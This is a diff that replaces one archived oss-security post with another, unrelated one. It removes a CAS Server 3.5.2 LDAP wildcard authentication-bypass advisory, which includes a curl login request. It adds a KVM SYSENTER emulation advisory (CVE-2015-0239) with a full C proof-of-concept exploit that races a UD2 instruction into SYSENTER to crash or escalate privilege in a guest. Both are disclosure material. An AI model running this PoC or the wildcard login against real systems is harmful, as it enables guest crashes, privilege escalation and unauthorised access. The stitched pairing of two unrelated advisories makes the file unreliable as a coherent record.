@@ -1,100 +1,170 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2015/01/21/11
-Message-ID: <CAFCb7ujG562x5DwhF_+zJQCh5om+Ux-4tur6kJWa21QHFR3T6A@mail.gmail.com>
-Date: Wed, 21 Jan 2015 12:49:38 -0200
-From: "J. Tozo" <juniorbsd@...il.com>
-To: oss-security@...ts.openwall.com, fulldisclosure@...lists.org
-Subject: CVE-2015-1169 - CAS Server 3.5.2 allows remote attackers to bypass LDAP authentication via crafted wildcards.
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2015/01/27/6
+Message-Id: <37E51B35-53A2-4A96-8D93-C3E1C936F6E7@gmail.com>
+Date: Tue, 27 Jan 2015 14:17:22 +0200
+From: Nadav Amit <nadav.amit@...il.com>
+To: oss-security@...ts.openwall.com
+Cc: Red Hat Product Security <secalert@...hat.com>, Paolo Bonzini <pbonzini@...hat.com>
+Subject: KVM SYSENTER emulation vulnerability - CVE-2015-0239
 Content-Type: text/plain; charset=utf-8
 
-=====[Alligator Security Team - Security Advisory]========
+Linux 2.6.32 - 3.18 that runs KVM may enable a malicious guest process to
+crash the guest OS or launch a privilege escalation attack on the guest. The
+attack can be launched by tricking the hypervisor to emulate a SYSENTER
+instruction in 16-bit mode, if the guest OS does not initialize the SYSENTER
+MSRs. KVM does not check under these conditions that the selector
+IA32_SYSENTER_CS is not zero, and does not generate a #GP exception as real
+hardware does. Instead, it sets the guest instruction pointer to zero and
+changes the code privilege level (CPL) to zero (privileged). Note that the
+attack can only be issued under very certain conditions (see the details
+below). Windows and distro Linux guest OSes should be safe.
 
-  CVE-2015-1169 - CAS Server 3.5.2 allows remote attackers to bypass LDAP
-authentication via crafted wildcards.
+The bug existed since the introduction of SYSENTER emulation (em_sysenter
+function on recent Linux releases), in commit
+8c60435261deaefeb53ce3222d04d7d5bea81296 , which is present in Linux 2.6.32
+- 3.18.
 
-  Reporter: José Tozo  < juniorbsd () gmail com >
+To fix the bug, you can apply the following patch -
+http://permalink.gmane.org/gmane.linux.kernel.commits.head/502245
 
-=====[Table of Contents]==================================
+There are no known exploits of the vulnerability. Red-hat assigned
+CVE-2015-0239 for this vulnerability.
 
-1. Background
-2. Detailed description
-3. Other contexts & solutions
-4. Timeline
-5. References
 
-=====[1. Background]======================================
+Details:
 
- CAS is an authentication system originally created by Yale University to
-provide a trusted way for an application to authenticate a user.
+The success of such an attack and its results depend on the guest OS. It is
+inapplicable if the guest OS initializes the SYSENTER MSRs, as Linux usually
+does. If the MSRs were not initialized, it can be used to crash the guest OS
+or for privilege escalation. However, it cannot be used for privilege
+escalation if the guest cannot access the first memory page, whose virtual
+address is zero.
 
-=====[2. Detailed description]============================
+As a result of these limitations the attack is only possible in when the
+guest uses certain OSes, for instance, Linux which was built without
+CONFIG_IA32_EMULATION (support for legacy 32-bit programs) or FreeBSD. In
+these systems, guest DoS is possible. Privilege escalation attack requires
+that in addition guest processes would be able to access address zero. For
+Linux guest, this requirement means the the kernel parameter
+vm.mmap_min_addr is set to zero.
 
-A valid username and password required.
+An attack can be launched on an SMP guest, using guest code that tricks KVM
+into emulating the SYSENTER instruction. The attached PoC does just that. It
+first writes a UD2 instruction, causing a #UD exception and a subsequent
+VM-exit, and then tries from another thread to rewrite the UD2 instruction
+with SYSENTER just before KVM emulates the instruction. The PoC is not fully
+automatic since dealing with signals in 16-bit code is annoying. The PoC
+therefore takes an argument that tells it how many cycles to wait before
+creating the race that fools the hypervisor into emulating a SYSENTER
+instruction. On my system, using 100 as an input results produces the
+exploit.  Using the PoC I manages to crash the
+guest Linux kernel, causing a double fault; and to demonstrate privilege
+escalation by successfully executing “int $2” that caused spurious NMI.
 
-Given a username johndoe and a password superpass, you can sucessfully
-achieve login using wildcards:
+Regardless to SMP, it appears that an attack can also
+be launched on UP, if the guest is configured to run on Intel VCPU while the
+real CPU is AMD. AMD CPUs do not support SYSENTER in compatibility mode; KVM
+would emulate them so the VCPU would behave as if the physical CPU is Intel.
+This is likely to trigger the vulnerability.
 
-username: jo*
-password: superpass
 
-The login will be sucessfully only if the ldap bind search return one
-unique member.
 
-The vulnerability described in this document can be validated using the
-following example:
+—
 
-Client Request:
-root@...hine:/# curl -k -L -d "username=jo%2A&password=superpass"
-https://login.cas-server.com/v1/tickets
+// KVM SYSENTER EXPLOIT 
 
-(note that * was url encoded to %2A)
+// Some of the code of the PoC was borrowed from code that was written by
+// Andy Lutomirski for another vulnerability.
 
-<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
-<html>
-   <head>
-      <title>201 The request has been fulfilled and resulted in a new
-resource being created</title>
-   </head>
-   <body>
-      <h1>TGT Created</h1>
-      <form action="
-https://xxx.xxx.xxx.xxx/v1/tickets/TGT-76-ABTSuXWB7sECDGqbe5W4jyxR43YYiTubPsEup9m4gNFpytGSaz"
-method="POST">Service:<input type="text" name="service" value=""><br><input
-type="submit" value="Submit"></form>
-   </body>
-</html>
+#include <pthread.h>
+#include <err.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdint.h>
+#include <signal.h>
+#include <setjmp.h>
+#include <string.h>
+#include <stdbool.h>
+#include <sys/io.h>
+#include <asm/ldt.h>
+#include <sys/types.h>
+#include <sys/mman.h>
 
-Server log:
-=============================================================
-WHO: [username: jo*]
-WHAT: TGT-76-ABTSuXWB7sECDGqbe5W4jyxR43YYiTubPsEup9m4gNFpytGSaz
-ACTION: TICKET_GRANTING_TICKET_CREATED
-APPLICATION: CAS
-WHEN: Tue Jan 20 18:38:17 BRST 2015
-CLIENT IP ADDRESS: xxx.xxx.xxx.xxx
-SERVER IP ADDRESS: xxx.xxx.xxx.xxx
-=============================================================
+//#define MMAP_EXPLOIT
 
-=====[3. Other contexts & solutions]======================
+asm (	".pushsection .wtext, \"awx\"\n"
+	"cs16ip1: \n\t"
+	".int 0\n\t"
+	".byte 0xf, 0\n\t"  
+	"entry1:\n\t"
+	"ljmp *(cs16ip1)\n\t"
+     	"badcode:\n\t"
+	".code16\n\t"
+     	"ud2\n\t"
+	"jmp badcode\n\t"
+	".code64\n\t"
+     	".popsection\n\t");
 
- In order to apply the patch, you have to update at least to version 3.5.3.
-Newer versions, such as CAS 4.0.0 and above, are not vulnerable.
+volatile int sync = 0;
 
-=====[4. Timeline]========================================
+extern volatile unsigned short badcode[];
+extern volatile void *entry1;
 
-29/12/14 Vendor notification.
-14/01/15 Vendor rolled out new version 3.5.3
-17/01/15 Mitre assigned CVE-2015-1169.
-21/01/15 Disclosure date.
+int wait_cycles;
 
-=====[5. References]=======================================
+static void *proc(void *ignored)
+{
+	sync = 1;
+	while (true) {
+		volatile int cycles;
+		badcode[0] = 0x340f; // sysenter
+		asm volatile ("clflush (%0)\n\t" : : "r"(badcode));
+		for (cycles = 0; cycles < wait_cycles; cycles++);
+	}
+	return NULL;
+}
 
-1 - https://github.com/Jasig/cas/pull/411
-2 -
-https://github.com/Jasig/cas/commit/7de61b4c6244af9ff8e75a2c92a570f3b075309c
+int main(int argc, char *argv[])
+{
+	int res;
+	void *mem;
+	pthread_t pth;
+	struct user_desc d = {
+		.entry_number = 1,
+		.base_addr = (unsigned long)&badcode,
+		.limit = 0xfffffu,
+		.seg_32bit = 0, 
+		.contents = 2,
+		.read_exec_only = 0,
+		.limit_in_pages = 1,
+		.seg_not_present = 0,
+		.useable = 0,
+	};
+	if (argc < 2) {
+		printf("usage: ./sysenter [cycles]\n"); // 100 cycles works for me
+		exit(-1);
+	}
+	wait_cycles = atoi(argv[1]);
+#if MMAP_EXPLOIT
+	mem = mmap(NULL, 4096, PROT_EXEC | PROT_READ | PROT_WRITE,
+                       MAP_ANON | MAP_PRIVATE | MAP_POPULATE | MAP_FIXED, -1, 0);
+	if (mem != NULL) {
+		printf("Problem setting mmap to NULL\n");
+		exit(-1);
+	}
+	*(unsigned short *)mem = 0x02cd; // int $2
+#endif
+	res = modify_ldt(1, &d, sizeof(d));
+	if (res != 0) {
+		printf("Problem setting LDT entry\n");
+		exit(-1);
+	}
 
--- 
-Grato,
+	pthread_create(&pth, NULL, proc, NULL);
+	while (!sync);
+	badcode[0] = 0x0b0f; // ud2
+	asm volatile ("call entry1" : : : "flags");
+	return 0;
+}
 
- Tozo
 
